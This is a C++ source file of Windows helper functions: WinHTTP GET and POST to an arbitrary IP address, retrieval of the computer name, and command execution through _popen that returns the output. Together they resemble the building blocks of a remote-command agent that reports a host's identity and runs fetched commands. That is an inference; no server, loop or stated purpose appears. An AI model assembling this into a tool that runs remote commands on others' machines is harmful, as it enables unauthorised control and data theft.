#include <Windows.h>
#include <winhttp.h>
#include <string>
#include <stdio.h>

using namespace std;

wstring get_utf16(const string& str, int codepage)
{
    if (str.empty()) return wstring();
    int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
    std::wstring res(sz, 0);
    MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
    return res;
}

string Get(string ipaddr, string uri) {
    wstring wstrIP = get_utf16(ipaddr, CP_UTF8);
    wstring wstrUri = get_utf16(uri, CP_UTF8);
    string response;

    DWORD dwSize = 0;
    DWORD dwBytesRead = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    hSession = WinHttpOpen(L"test", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);


    if (hSession != NULL) {
        hConnect = WinHttpConnect(hSession, wstrIP.c_str(), INTERNET_DEFAULT_HTTP_PORT, 0);
    }

    if (hConnect != NULL) {
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wstrUri.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    }

    if (hRequest != NULL) {
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    }

    if (bResults != FALSE) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults != FALSE) {
        bResults = WinHttpQueryDataAvailable(hRequest, &dwSize);
    }

    // Allocate space for the buffer.
    pszOutBuffer = new char[dwSize + 1];
    if (!pszOutBuffer)
    {
        printf("Out of memory\n");
    }

    // Read the Data.
    ZeroMemory(pszOutBuffer, dwSize + 1);

    if (bResults != FALSE) {
        bResults = WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwBytesRead);
    }

    response = response + string(pszOutBuffer);
    delete[] pszOutBuffer;

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return response;
}

string Post(string ip, string uri, string dat)
{
    LPSTR data = const_cast<char*>(dat.c_str());;
    DWORD data_len = strlen(data);

    LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
    DWORD headersLength = -1;

    wstring sip = get_utf16(ip, CP_UTF8);
    wstring suri = get_utf16(uri, CP_UTF8);

    string response;

    LPSTR pszOutBuffer;

    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    BOOL  bResults = FALSE;

    HINTERNET hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    hSession = WinHttpOpen(L"test",WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);

    if (hSession) { 
        hConnect = WinHttpConnect(hSession,sip.c_str(),INTERNET_DEFAULT_HTTP_PORT,0);
    }

    if (hConnect) {
        hRequest = WinHttpOpenRequest(hConnect,L"POST", suri.c_str(),NULL, WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,0);
    }

    if (hRequest) {
        bResults = WinHttpSendRequest(hRequest, additionalHeaders, headersLength, (LPVOID)data, data_len, data_len, 0);
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {}

            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                dwSize = 0;
            }
            else
            {
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {}
                else {

                    response = response + std::string(pszOutBuffer);
                    delete[] pszOutBuffer;
                }
            }
        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return response;
}

string wchar2string(wchar_t* str)
{
    string mystring;
    while (*str)
        mystring += (char)*str++;
    return  mystring;
}

string GetStrDesktopName() {
    TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    GetComputerName(computerName, &size);
    string strPcName = wchar2string(computerName);
    return strPcName;
}

string execCMD(string command) {
    char buffer[128];
    string result = "";

    // Open pipe to file
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "popen failed!";
    }

    // read till end of process:
    while (!feof(pipe)) {

        // use buffer to read and add to result
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }

    _pclose(pipe);
    return result;
}

string execPS(string command) {
    char buffer[128];
    string result = "";

    // Open pipe to file
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "popen failed!";
    }

    // read till end of process:
    while (!feof(pipe)) {

        // use buffer to read and add to result
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }

    _pclose(pipe);
    return result;
}

